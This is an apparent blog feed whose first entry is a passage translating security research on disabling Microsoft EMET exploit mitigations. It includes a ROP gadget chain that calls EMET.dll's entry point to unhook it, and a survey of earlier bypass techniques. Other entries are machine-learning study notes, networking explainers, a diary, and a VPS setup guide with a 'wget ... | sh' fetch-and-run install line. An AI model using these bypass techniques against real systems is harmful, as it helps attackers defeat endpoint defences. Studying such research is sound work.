ADD EBX,EAX # RETN // add 0x28 with PE header offset from base address (RVA of OEP)

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // ADD previously copied EMET_DLL_BASE to NULLed EAX

ADD EAX,[EBX] # RETN // ADD EMET_DLL_BASE with OEP RVA =&gt; EAX = VA of OEP

XCHG EAX,ECX # RETN // copying EAX into ECX

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // copy EMET_DLL_BASE into eax

XCHG EAX,ESI # RETN // copy EMET_DLL_BASE into EAX

// ESI contains EMET_DLL_BASE &amp; ECX contains OEP address

PUSH ESI # CALL ECX # RETN // call OEP of EMET.dll with EMET_DLL_BASE on top of stack as PARAM1

0x0 // PARAM2 fdwReason == DLL_PROCESS_DETACH | 0

0x0// PARAM3 Reserved

// When Call ECX returns to RETN instruction stack top is as following

// and All hooks are gone Since EMET.dll just received a DETACH signal
</code></pre>

<h2 id="toc_3">以前的EMET绕过技术</h2>

<p>之前用于绕过EMET的技术都基于设计和实现上的失误，可能是因为一些模块和API不太安全。我们会描述一些绕过的技巧。</p>

<p>因为LoadLibrary是一个关键API，如果被『返回(return)』命令或者『跳出(jump)』命令调用，EMET4.1会抛出一个exception，但是Jared DeMott向我们展示了，通过『调用(call)』命令来调用LoadLibrary API，而不是『跳出(jump)』或『返回(return)』命令，绕过了EMET LoadLibrary的保护[2]。</p>

<p>LoadLibrary API一直被监视着，防止被用于调用UNC路径（比如说一些恶意dll）。Aaron Portnoy展示了我们能够通过MoveFile API（EMET4.0没有监视这个API）来绕过它，并下载一个能够被LoadLibrary API加载的DLL文件[3]。</p>

<p>EMET4.1的调用检查保护(Caller check protection)，是通过检查关键Windows API是否被通过调用、返回、跳出命令来调用，以防止ROP程序的执行。其中，后两种命令被广泛运用与ROP程序。DeMott展示了一个通过执行一个合法的关键API调用，来绕过调用检查保护的方法[2]。DeMott没有直接通过返回或者跳出命令来调用VirtualAlloc API（这会导致EMET抛出exception），而是在一个已被加载的模块中，使用调用命令来调用。并且，通过返回调用命令所在的地址，我们成功调用了关键Windows API而没被EMET干扰。</p>

<p>关键Windows API都位于kernel32.dll, ntdll.dll和 kernelbase.dll中。EMET3.5把前两个模块中的函数挂上hook，但是没有处理kernelbase.dll。Shahriyar Jalayeri利用这一事实来执行位于kernelbase模块中的VirtualProtect API，来使得内存可写可执行[4]。但是，在EMET4.0发布以后，函数保护应用到了几乎最低等级的关键Windows API上面。</p>

<p>Jalayeri还通过使用 <u>KUSER</u>SHARED_DATA结构(它的地址固定在0x7ffe0000上)来绕过EMET。位于0x300地址上的是一个SystemCallStub指针，指向一个执行系统级命令的函数KiFastSystemCall。由此，他能够通过指明EAX注册器里的地址（比如0x0D7指向ZwProtectVirtualMemory），来调用任何系统级调用。而且Jalayeri能够通过返回指令来修改函数头部，使其失效，导致EMET完全无效。</p>

<p>EAF通过debug注册器，在输出函数（比如kernel32.dll里的函数）的入口布下断点。这些断点，能够通过使用import access table的shellcode来绕过，而不是export acccess table，因为这个保护只能用于export acccess table。</p>

<h2 id="toc_4">以前的EMET禁用技术</h2>

<p>不像通过绕开保护的绕过技术，禁用EMET是完全关闭它的保护。比如说EAF（和一部分的EAF+）能够通过清除硬件断点（比如置零debug注册器）。Piotr Bania通过使用文档中没有写出来的的Windows API——NtSetContextThread和NtContinue来实现这一目的。但是因为EMET把NtSetContextThread hook上了，我们应该先把EMET的保护关闭，才能使用NtSetContextThread来干活。</p>

<p>Offensive Security发现EMET4.1的大部分保护行为，都会先去检查一个保存在位于emet.dll的0x0007E220位置上的一个外部全局变量；如果那个变量的值是0，那么保护函数就不会对调用代码做手脚[6]。说明这个全局变量是一个全局开关，用于打开/关闭EMET的保护，并且如果把这个变量放在了一个能够写入的位置，攻击者就能够构造一个ROP程序来把这个变量轻松地置零。</p>

<p>经过分析，我们发现EMET v2.1也在0xC410上含有相同的全局开关，由此，我们怀疑EMET从最早的版本开始就含有这一固定地址的全局开关了。这个问题直到EMET5.0的发布才修复。</p>

<p>Offensive Security还发现，EMET5.0把这个全局变量放到了大型结构（比如CONFIG_STRUCT）里的堆里面，大小是0x560 bytes [7]。但是，思路还是一样的，因为还是存在一个位于固定地址0x0AA84C的指针指向CONFIG_STRUCT。作为保护，EMET使用EncodePointer来把指针的值编码了一下，并且每次EMET执行保护的时要检查这个值，就会调用DecodePointer函数来解码它以获得CONFIG_STRUCT的地址。把地址CONFIG_STRUCT+0x558 置零，能够关掉EMET的大部分保护。同时，通过位于CONFIG_STRUCT+0x518的指针，调用没被hook的函数NtSetContextThread，就能关掉EAF和EAF+。</p>

<p>在EMET5.1里面，Offensive Security发现位于0xF2A30的全局变量里面，保存了编码过的指针值，指向一些结构(比如EMETd)[8]。这个EMETd里面有一个指针域，指向CONFIG_STRUCT结构，也就是那个在CONFIG_STRUCT+0x558里保存了全局开关那个，以此作为一层额外的保护层，保护编码过的指针。EMET5.1使用cpuid命令来把返回的结果和编码过的指针值进行异或。想要解码CONFIG_STRUCT，他们使用了emet.dll里位于0x67372的代码，把EMETd解码出来，然后返回解码了的CONFIG_STRUCT的指针。因为那些全局开关（比如CONFIG_STRUCT+0x558）都储存在只读内存页中，Offensive Security找到了一个方法，通过EMET里面没被hook的指针来修改里面的值。他们用了一个没hook的指针指向位于CONFIG_STRUCT+0x1b8的ntdll!NtProtectVirtualMemory函数，来把它标记为可写内存页，所以他们能够把位于CONFIG_STRUCT+0x558的全局开关置零。想要禁用EAF和EAF+，他们用了一个指向NtSetContextThread的没hook指针，然后剩下的就和禁用EMET5.0一样了。</p>

<h2 id="toc_5">结论</h2>

<p>这个新技术使用EMET来禁用EMET保护，非常的可靠并且相比之前的绕过或禁用技巧更加容易利用。这整个技术都能包含到一个简单粗暴的ROP链中。你只需要弄出一个加载GetModuleHandleW的DLL（比如mshtml.dll）的地址，而不需要进程空间里面的完整可读能力。因为emet.dll里面的DllMain函数被导出了，所以绕过已经不需要对应版本来设置地址，它适用于所有版本的EMET（4.1, 5.1, 5.2, 5.2.0.1）。</p>

<p>在EMET的<em>里面</em>，通过可用的内部代码来禁用EMET，给了我们一直全新的攻击思路。定位DllMain并且调用它来关掉EMET的保护，相比一个一个地绕过保护，然后偷偷改掉其中的参数来说，简直轻松加愉快。</p>

<p>鸣谢：Michael Sikorski, Dan Caselden, Corbin Souffrant, Genwei Jiang, and Matthew Graeber</p>

<h2 id="toc_6">附录</h2>

<h3 id="toc_7">EMET的保护</h3>

<p>EMET经过了许多年的迭代，以下对它的功能作一些简短的描述：</p>

<h4 id="toc_8">EMET 1.x， 发布于 2009年10月27日</h4>

<p>Structured Exception Handling Overwrite Protection (SEHOP)：提供对抗重写异常处理句柄的保护。<br/>
Dynamic Data Execution Prevention (DEP)：加强了DEP，使得一些数据类如堆和栈都不能执行。<br/>
NULL page allocation：修复间接引用空指针导致的漏洞<br/>
Heap spray allocation: 防止Heap spray攻击。</p>

<h4 id="toc_9">EMET 2.x， 发布于 2010年9月2日</h4>

<p>Mandatory Address Space Layout Randomization (ASLR)：加强了模块地址的随机化，即使是以前没有使用ASLR进行编译的模块。</p>

<p>Export Address Table Access Filtering (EAF)：普通的shellcode在已加载的模块导出的函数中迭代，来解析关键Windows API。这些通常由kernel32.dll, ntdll.dll和kernelbase.dll导出。EMET使用保存在debug注册器（比如DR0）的硬件断点来停止那些尝试读取这些模块的导出表的动作，并且让EMET验证它是否合法。</p>

<h4 id="toc_10">EMET 3.x， 发布于 2012年5月25日</h4>

<p>从ROPGuard中导入了用于对抗ROP的策略。<br/>
导入库时的检查：防止从UNC路径中导入DLL。<br/>
ROP 策略 - 内存保护检查：保护关键Windows API，类似VirtualProtect，会使得栈被标记为可执行。<br/>
ROP 策略 - 调用检查：防止关键Windows API被通过返回或跳出命令执行；<br/>
ROP 策略 - Stack Pivot：检测是否被进行Stack Pivot攻击。<br/>
ROP 策略 - 模拟执行流：通过手动操作栈注册器来模拟执行，以此检查它是否在没有使用调用命令的情况下调用了Windows API。这被认为是EMET在探测ROP程序。<br/>
仔细设计ASLR：在已加载的模块地址上增加了随机的8位熵。</p>

<h4 id="toc_11">EMET 4.x， 发布于 2013年4月18日</h4>

<p>Deep Hooks:当这个特性开启，EMET会把所有等级的Windows API都hook上。</p>

<p>抗绕过：因为EMET在已经hook的Windows API函数头部放了一个跳出命令，攻击者能够构造一个ROP，能够返回跳出命令之后的代码上。这项保护尝试阻止这一绕过。</p>

<p>禁用函数：默认禁止调用ntdll!LdrHotpatchRoutine函数来防止DEP/ASLR被绕过。也可以添加其他函数。</p>

<p>认证信任：在认证链信任检测步骤，提供更多的检查和验证。一般这只支持IE。</p>

<h4 id="toc_12">EMET 5.x， 发布于 2014年7月31日</h4>

<p>加入Attack Surface Reduction (ASR)：允许添加配置列表来进制特定的应用不允许加载某些模块。</p>

<p>EAF+：类似EAF，它能保护关键模块导出表如kernel32.dll, ntdll.dll和kernelbase.dll。它同时也能探测栈指针是否指向栈外部的某处，或者frame和栈的指针是否一致。</p>

<h2 id="toc_13">参考</h2>

<p>[1] “Inside EMET 4.0” by Elias Bachaalany, <a href="http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf">http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf</a><br/>
[2] “Bypassing EMET 4.1” by Jared DeMott, <a href="http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/">http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/</a><br/>
[3] “Bypassing All of The Things” by Aaron Portnoy, <a href="https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf">https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf</a><br/>
[4] &ldquo;Bypassing EMET 3.5&rsquo;s ROP Mitigations&rdquo; by Shahriyar Jalayeri, <a href="https://github.com/shjalayeri/emet_bypass">https://github.com/shjalayeri/emet_bypass</a><br/>
[5] &ldquo;Bypassing EMET Export Address Table Access Filtering feature&rdquo; by Piotr Bania, <a href="http://piotrbania.com/all/articles/anti_emet_eaf.txt">http://piotrbania.com/all/articles/anti_emet_eaf.txt</a><br/>
[6] &ldquo;Disarming Enhanced Mitigation Experience Toolkit (EMET)&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/">https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/</a><br/>
[7] &ldquo;Disarming EMET v5.0&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-emet-v5-0/">https://www.offensive-security.com/vulndev/disarming-emet-v5-0/</a><br/>
[8] &ldquo;Disarming and Bypassing EMET 5.1&rdquo; by Offensive-Security, <a href="https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/">https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ideas for Neural Network]]></title>
    <link href="http://yinzo.github.io/14570954925763.html"/>
    <updated>2016-03-04T20:44:52+08:00</updated>
    <id>http://yinzo.github.io/14570954925763.html</id>
    <content type="html"><![CDATA[
<ul>
<li>Use genetic algorithm to evolve the parameters in Neural Network, to make a self-develop algorithm.

<ul>
<li>automatically find and make training set from search engine</li>
<li>the paremeters include:

<ul>
<li>learning rate</li>
<li>iteration times</li>
<li>regularization term \(\lambda\)</li>
<li>activation function</li>
<li>number of hidden layers(units)</li>
</ul></li>
</ul></li>
</ul>

<span id="more"></span><!-- more -->

<ul>
<li>About MCS, maybe we can train a model for fusion method to do the judge.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Notes for Neural Network]]></title>
    <link href="http://yinzo.github.io/14569378376035.html"/>
    <updated>2016-03-03T00:57:17+08:00</updated>
    <id>http://yinzo.github.io/14569378376035.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">Notes:</h2>

<ul>
<li><p>If we set the initial \(\Theta\) be the same, the units in next layer with the same \(x_i\) will get the same result, then all units in the same layer will get the same output. At last, the cost function will also get same cost, so we will update the \(\Theta\) with same step.</p></li>
<li><p>seems \(\delta^{(l)}_{i}\) means the cost of \(i_{th}\) unit in the \(l_{th}\) layer</p></li>
</ul>

<span id="more"></span><!-- more -->

<h2 id="toc_1">Question about MLP:</h2>

<ul>
<li>How to decide the iteration times</li>
<li>How to initialize the weight \(w_i\)

<ul>
<li>solved. random initialized. But still didn&rsquo;t fully understand the formula。</li>
</ul></li>
<li>How to choose the learning rate \(\alpha\)</li>
<li>How to choose the activation function

<ul>
<li>what&rsquo;s the different between sigmoid and other functions.</li>
</ul></li>
<li>How to decision the number of hidden layers and the number of the units in hidden layers

<ul>
<li>simply explained. Mostly take 3 layers, and the hidden layers usually take a fixed number of units.</li>
</ul></li>
<li>What the \(\Delta^{(i)}\) does in the \(\Theta^{(i)}\) updating.</li>
<li>What Back Propagation algorithm does in the training process? It is only used to calculate the partial derivatives of Cost Function that used to update the \(\Theta\)?</li>
<li>Why every article about NN mentions that Perceptron can finish logical operations? Is there some theory about with logical operation we can simulate the human brain or sth?</li>
</ul>

<h2 id="toc_2">My understanding about the process of building a MLP(Multiple Layer Perceptron)</h2>

<p>We can simply divide this into 2 part:</p>

<ol>
<li>Train the \(\Theta\) for the MLP.</li>
<li><p>Use the trained \(\Theta\) to predict the input&rsquo;s classification.</p></li>
<li><p>The second part is much more easier, let&rsquo;s first assume that we already have a set of trained \(\Theta\) , and we are now trying to use these \(\Theta\) to predict a testing samples.</p>

<p><strong>The thing you need to do is just:</strong></p>

<ol>
<li>Multiply the input \(X\) with each layer&rsquo;s \(\Theta\)</li>
<li>Do some small fixed in it (adding bias, choose the most possible option e.t.c.)</li>
</ol>

<p><strong>And you can get the prediction! What an easy job!</strong></p></li>
<li><p>Then, we are now facing the training part</p>

<ol>
<li>First randomly initialized the \(\Theta\). (Why we don&rsquo;t simply use 1 or 0? Read this!)</li>
<li>Build a function that we can calculate the difference between our prediction and the fact. We call it Cost Function, and use it to evaluate our prediction.</li>
<li>Then, take that Cost Function as a measurement, we use a searching algorithm (i.e. Gradient Descents), to find out the best \(\Theta\) which could minimized the Cost.</li>
</ol></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Note for "Thesis - Behavior of Machine Learning Algorithms in Adversarial Environments.pdf"(1)]]></title>
    <link href="http://yinzo.github.io/14545761055440.html"/>
    <updated>2016-02-04T16:55:05+08:00</updated>
    <id>http://yinzo.github.io/14545761055440.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">1.1 Motivation and Methodology</h2>

<h4 id="toc_1">Learning approach is well-suited to the scenario when:</h4>

<ol>
<li>The process is too complex to designed for human operator</li>
<li>Requirement of dynamical development</li>
</ol>

<span id="more"></span><!-- more -->

<h4 id="toc_2">An intelligent adversary can:</h4>

<ul>
<li>Alter his approach based on knowledge of the learner&rsquo;s shortcomings</li>
<li>Mislead it by cleverly crafting data to corrupt </li>
<li>Deceive the learning process</li>
</ul>

<h4 id="toc_3">Potential dangers posed to a learning system:</h4>

<ul>
<li>An attacker can exploit the nature of a machine learning system to mis-train it and cause it to fail</li>
</ul>

<h4 id="toc_4">The questions raised by author:</h4>

<ul>
<li>What techniques can a patient adversary use to mis-train or evade a learning system?</li>
<li>How can system designers assess the vulnerability of their system to vigilantly incorporate trustworthy learning methods?</li>
</ul>

<h4 id="toc_5">An algorithm&rsquo;s performance depends on:</h4>

<ul>
<li>The constraints placed on the adversary</li>
<li>The job the algorithm is tasked with performing</li>
</ul>

<p>This raises two fundamental questions:</p>

<ul>
<li>How can we evaluate a learner&rsquo;s performance in adversarial environment?</li>
<li>How to design or select a learner which can be satisfied for its performance in particular environment?</li>
</ul>

<h3 id="toc_6">Example 1.1</h3>

<h4 id="toc_7">How spammer corrupt the learning mechanism:</h4>

<ol>
<li>use information about the email distribution to construct clever attack spam messages</li>
<li>will cause the spam filter to misclassify the user’s desired messages as spam.</li>
<li>to cause the filter to become so unreliable</li>
</ol>

<h3 id="toc_8">Example 1.2</h3>

<h4 id="toc_9">The ANTIDOTE&rsquo;s feature:</h4>

<ul>
<li>Better resistance within the poisoned environment</li>
<li>But Less effective on non-poisoned environment</li>
</ul>

<h3 id="toc_10">Example 1.3</h3>

<h4 id="toc_11">The means to evade the filter:</h4>

<ul>
<li>obfuscating words indicative of spam to human-recognizable misspellings; e.g., “Viagra” to“V1@gra” or “Cialis” to “Gia|is”</li>
<li>using clever HTML to make the content difficult to parse </li>
<li>adding words or text from other sources unrelated to the spam</li>
<li>embedding images that contains the spam message.</li>
</ul>

<h2 id="toc_12">1.2 Guidelines from Computer Security</h2>

<h4 id="toc_13">Author&rsquo;s principles:</h4>

<ul>
<li>Proactively Analysis</li>
<li>Kerckhoffs’ Principle</li>
<li>Conservative Design</li>
<li>Threat Modeling</li>
</ul>

<h3 id="toc_14">Proactive Analysis:</h3>

<p>Proactively find the vulnerabilities of learning system before the it is deployed or widely used.</p>

<h3 id="toc_15">Kerckhoffs&#39; Principle:</h3>

<p>Do not let a system&rsquo;s security rely on secrets. If the secrets are exposed, the system is immediately compromised.</p>

<p>So apply this principle into machine learning, we should assume the adversary is aware of the learning algorithm and can obtain some data used to train the model.</p>

<h3 id="toc_16">Conservative Design:</h3>

<p>When access the security of a system, we should avoid to put limit on adversary&rsquo;s behavior. We should assume that the adversary has the broadest possible powers.</p>

<p>Conversely, though the adversary too powerfully may lead to an inappropriate assessment on the system.</p>

<h3 id="toc_17">Threat Modeling:</h3>

<p>A completely secure system is infeasible. So author qualified the systems with <em>degree of security</em> -—the level of security expected against an adversary based on a <em>threat model</em> with a certain set of:</p>

<ul>
<li>objectives </li>
<li>capabilities</li>
<li>incentives</li>
</ul>

<h4 id="toc_18">To construct a threat model for a particular learning system:</h4>

<ol>
<li>Quantifies the security setting and objectives of that system, to develop criteria to measure success and quantify the level of security offered.</li>
<li>Formalizing the risks and objectives, to identify potential limitations of the system and potential attacks.</li>
<li>Identifies potential adversarial goals, resources and limitations.</li>
</ol>

<h4 id="toc_19">To evaluating a system:</h4>

<ol>
<li>Determining classed of attacks on the system.</li>
<li>Evaluating the resilience of the system against those attacks</li>
<li>Strengthening the system against those classes of attacks.</li>
</ol>

<h2 id="toc_20">1.3 Historical Roadmap</h2>

<p>Some experience of author when developing this thesis, seems irrelevant to the mainstream.</p>

<h2 id="toc_21">1.4 Dissertation Organization</h2>

<p>As the title, no useful informations.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[封装，与协议的分层]]></title>
    <link href="http://yinzo.github.io/14540640657446.html"/>
    <updated>2016-01-29T18:41:05+08:00</updated>
    <id>http://yinzo.github.io/14540640657446.html</id>
    <content type="html"><![CDATA[
<p>TODO： 为何要分层</p>

<p>要理解协议的分层，若是了解编程理念中的『封装』，可能更有助于理解分层的意义。</p>

<p>『封装』，狭义上指的是编写程序时，通过把一些重复操作的代码写成一个单独的函数，这就可以叫做一个简单的封装。</p>

<p>而我对于封装的理解，举个例子，当你忙了一天回到家，站在你的家门口，想要打开你家的房门时，你需要做以下事情：</p>

<pre><code class="language-flow">st=&gt;start: 站在家门口
op1=&gt;operation: 拿出钥匙
op2=&gt;operation: 找到对应的钥匙
op3=&gt;operation: 把钥匙插到锁孔中
op4=&gt;operation: 旋转钥匙
op5=&gt;operation: 拉开门
op6=&gt;operation: 拔出钥匙
end=&gt;end: 开门结束

st-&gt;op1-&gt;op2-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;end
</code></pre>

<span id="more"></span><!-- more -->

<p>步骤很多，对不对。不过这个描述也没错，我们的确需要做出这些步骤才能开门。</p>

<p>但是，我们和别人聊天的时候，你想要告诉别人你昨天很累，回到家马上就睡觉了，你会说『昨天我回到家门口，<strong>掏出钥匙，找到对应的钥匙……</strong>』吗？</p>

<p>我想大部分人都不会的。</p>

<p>我会说『昨天我回到家门口，<strong>打开门</strong>，马上就进到卧室睡觉了』，这实际上就是一个封装，我们把这些步骤封装成了一个『开门』的步骤。</p>

<p>看到这里你可能已经大概感觉到了，封装，实际上是把一些步骤，打包整合，使它变成了更高层次的行为。看到这里，我觉得我们应该停下来，多思考一会儿关于封装的概念，毕竟这个概念对于理解后面的协议分层非常关键，所以，让我们暂时停一下脚步，来观察并思考一下，我们日常生活中，还有哪些东西实际上也是一种封装吧。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[网络协议]]></title>
    <link href="http://yinzo.github.io/14540640466243.html"/>
    <updated>2016-01-29T18:40:46+08:00</updated>
    <id>http://yinzo.github.io/14540640466243.html</id>
    <content type="html"><![CDATA[
<p>连接不同的计算机是非常有必要的，能够大幅度提升工作效率。</p>

<p>比如：一个工作需要经过三个步骤，分别是步骤A/步骤B/步骤C。三个步骤分别由三台不同的计算机A/B/C执行。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
com_B=&gt;operation: 计算机B
com_C=&gt;operation: 计算机C


com_A-&gt;com_B-&gt;com_C
</code></pre>

<span id="more"></span><!-- more -->

<p>起初，人们使用容量极小的3.5寸盘，带着要处理的数据来到计算机A面前，执行完之后带着数据分别去B和C前进行操作处理，十分的低效。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
com_B=&gt;operation: 计算机B
com_C=&gt;operation: 计算机C
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;com_B-&gt;com_C-&gt;op
</code></pre>

<p>使用网络连接三台计算机之后，用户可以在A处理完数据，直接传递给B和C进行处理，再将处理结果传回A即可。</p>

<pre><code class="language-flow">com_A=&gt;operation: 计算机A
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;op
</code></pre>

<p>甚至，进一步的发展之后，用户都拥有了自己的计算机，则用户可以在任意一台连接了A的计算机上，比如自己的电脑，直接将数据传递到A、B、C计算机上处理，而无需离开自己的计算机进行操作。这一步的发展，即是当前的互联网。</p>

<pre><code class="language-flow">com_A=&gt;operation: 任一联网计算机
ip=&gt;inputoutput: 用户数据
op=&gt;inputoutput: 数据输出
ip-&gt;com_A-&gt;op
</code></pre>

<p>但是现实中，计算机不仅只由一家公司开发，不同公司的计算机起初只能与自家的计算机进行连接。不同种的计算机无法进行连接交流。就像语言不通的外国人，无法交流。</p>

<p>于是，为了连接不同种类计算机，我们统一了计算机交流的语言。由此，无论你的结构与其他计算机有多不同，只要能够使用这种统一语言，就能加入到互联网这个大聊天室之中，与任何计算机进行通信交流。</p>

<p>这种统一的语言，就是『协议』。</p>

<p>由于各种机缘巧合，TCP/IP协议成为了世界上主流的网络通信协议。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Notes for "ICMLC2009-FabioRoli.pdf"]]></title>
    <link href="http://yinzo.github.io/14540480758140.html"/>
    <updated>2016-01-29T14:14:35+08:00</updated>
    <id>http://yinzo.github.io/14540480758140.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">Understanding:</h2>

<h3 id="toc_1">1. What is adversarial classification? Basic concepts and motivations</h3>

<p>The Classifier which take the adversary actions into account. It can develop according to the adversary actions.</p>

<p>Its motivations is that the classical model cannot perform well in adversarial environments. Because the classical model is build and set up base on the random noise, it&rsquo;s also use for normal random noise environment. But in adversarial environment, the noise it face is adversarial noise, which is generated by adversary on purpose.</p>

<span id="more"></span><!-- more -->

<h4 id="toc_2">Points:</h4>

<ul>
<li>The classical model does not fit well with adversarial tasks</li>
<li>We need adversary-aware classification models</li>
</ul>

<h3 id="toc_3">2. Adversary-aware classification</h3>

<p>The classical model is build for the normal random noise. When facing the adversarial noise, its performance would be <em>significantly degrade</em>, while the adversary-aware model works better.</p>

<h4 id="toc_4">Points:</h4>

<ul>
<li>Classification algorithms should take into account the adversary</li>
<li>Classifier should be adaptive by exploiting any feedback that they can get about adversary&rsquo;s moves</li>
</ul>

<h3 id="toc_5">3. Vulnerability assessment in pattern classification systems</h3>

<p>The hardness of evading the spam classifier is regard as the judging standard of vulnerability assessment in pattern classification systems, which use the <em>minimum numbers of features that needs to be modified to evade classifier</em> to calculate the score.</p>

<h4 id="toc_6">Points:</h4>

<ul>
<li>Classification accuracy is not everything in adversarial tasks</li>
<li>Designer should maximize both accuracy and hardness of evasion of the classifier</li>
</ul>

<h3 id="toc_7">4. Defense strategies</h3>

<p>Basically, the main strategies is to make the evasion too costly for the adversary. We normally implement this by using multiple classifiers with different detect strategies, to add up the cost of evasion.</p>

<p>Also, for the close-source classifiers, we can make the classifiers activate randomly, which make the adversary needs to do much more detection ( \( \Theta(n) = 2^n \) ) , to figure out how the classifier work.</p>

<h4 id="toc_8">Points:</h4>

<ul>
<li>So for we have some state-of-the-art works on defense strategies against specific attacks for specific applications</li>
<li>Defense strategies against different types of attacks for different applications are a matter of on-going research</li>
</ul>

<h3 id="toc_9">5. Conclusions and open research issues</h3>

<p>There is few adversary-aware model, so does the general-purpose methods for vulnerability assessment and defenses against a variety of attacks.</p>

<ul>
<li>models base on various scenes</li>
<li>integrated strategies for defense and vulnerability assessment</li>
<li>put the test into reality but not simply static data sets</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[新建VPS应该做的事情]]></title>
    <link href="http://yinzo.github.io/14602073387108.html"/>
    <updated>2016-04-09T21:08:58+08:00</updated>
    <id>http://yinzo.github.io/14602073387108.html</id>
    <content type="html"><![CDATA[
<ol>
<li><p>创建root密码</p>

<pre><code>passwd
</code></pre></li>
<li><p>安装oh-my-zsh</p>

<p>这里是debian， 所以使用apt-get</p>

<ol>
<li><p>当然，首先，update &amp; upgrade apt-get</p>

<pre><code>apt-get update; apt-get upgrade
</code></pre></li>
<li><p>安装zsh、git、pip</p>

<pre><code>sudo apt-get install zsh git python-pip python-dev
</code></pre></li>
<li><p>安装oh my zsh</p>

<pre><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
</code></pre></li>
</ol></li>
</ol>

<span id="more"></span><!-- more -->

<ol>
<li><p>更换默认shell为zsh</p>

<pre><code>    chsh -s /usr/bin/zsh
</code></pre>

<p>这个路径不一定，如果不知道，可以使用<code>which zsh</code>来查看zsh位置</p></li>
<li><p>上传.zshrc</p>

<pre><code>scp ~/.zshrc root@*.*.*.*:~/
</code></pre>

<p>此处<code>*</code>为ip地址<br/><br/>
然后就要修改.zshrc了</p>

<ol>
<li>改zsh对应路径</li>
<li>还原插件列表</li>
<li>检查个性化设置如alias</li>
</ol></li>
<li><p>安装shadowsocks</p>

<p>pip install shadowsocks</p></li>
<li><p>建立 /etc/shadowsocks.json</p></li>
<li><p>在 /etc/rc.local 中加入shadowsocks的开启自启动</p>

<pre><code>/usr/bin/python /usr/local/bin/ssserver -c /etc/shadowsocks.json -d start
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2015暑假]]></title>
    <link href="http://yinzo.github.io/14608288193470.html"/>
    <updated>2016-04-17T01:46:59+08:00</updated>
    <id>http://yinzo.github.io/14608288193470.html</id>
    <content type="html"><![CDATA[
<p><img src="http://ww3.sinaimg.cn/mw690/7d52f1ffgw1evo7tqd6huj21kw16ok59.jpg" alt="晒猫"/></p>

<p>正式开始学习技术以来的第二个暑假了，上一个暑假的效率之高，可能没有什么机遇的话挺难超越的了。</p>

<p>先放一张这次暑假一开始的计划图以及其完成度。<br/>
<img src="http://ww4.sinaimg.cn/large/7d52f1ffgw1evo7tmpg20j20m507i3zp.jpg" alt="暑假计划"/></p>

<span id="more"></span><!-- more -->

<p>接下来一一说明</p>

<ol>
<li>暑假开始，第一个进行的是SmartQQBot的重构。这时已经回到了家中，主要都是在家里的42寸上完成的，效率不算太高，一个星期3K行左右的Python，主要时间花费在程序模块化逻辑的思考，以及优化二次开发流程上。</li>
<li>接下来，开始花了两天的零散时间整理归纳了自己当前（当时）的技能树，里面漏掉了后端部分中的NodeJS枝，不过也不算很熟练，只是基本入门写了个小东西的水平，也就不追加到博文里了。</li>
<li>深入学习Python。这一部分有少量在重构SmartQQBot的时候就开始了，主要使用<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000">廖雪峰的Python2.7教程</a>以及<a href="https://docs.python.org/2/">Python Documentation</a>，之所以没有标记为完成是因为没有固定的标准，在我看来Python值得我深入的地方还有很多，所以我选择标记为未完成。</li>
<li>预习下学期内容。这个部分其实算是坑掉了，因为到后期时间不多、精力不够（懒）的原因，只看完了《啊哈！算法》并用Python实现了部分算法就没有深入下去了。</li>
<li>深入学习SQL注入。主要使用Drops的大量注入相关文章，配合DVWA手工注入练习。基本了解了SQL注入的一些原理。（盲注还没来得及下手测试）期间在查阅资料的过程中顺手翻译了两篇文章，发到了Drops捞了一笔。标注为未完成的理由同Python。</li>
<li>Cookie-Pot这个项目被我意外的坑掉了。因为在深入了Python和注入之后，发现自己对于前端的内容是越来越不感兴趣了。这样看来我未来的方向里已经排除掉了前端，顶多作为个人爱好再发展发展了。</li>
<li>之后剩余了2周左右的时间，基本都在慢慢看《数学之美》。原本以为两周能看完的，但是里面NLP的部分完全理解需要的概率论知识我都不太记得了，而且课本没带回家，所以进度非常慢，算法理解度也不甚理想。</li>
</ol>

<p>除了以上计划中的内容，我还进行了以下活动</p>

<ol>
<li>暑假刚开始还没回家的两个星期。在学校接了一（两）单前端外包，大概也是因此对前端失去了部分兴趣。</li>
<li>帮一个师兄的项目写了个简易的前端，算是第一次与他人合作进行配合开发。以前都是自己规划自己写后端自己写前端，没有太多与人合作开发的经历。（这个仍在进行）</li>
</ol>

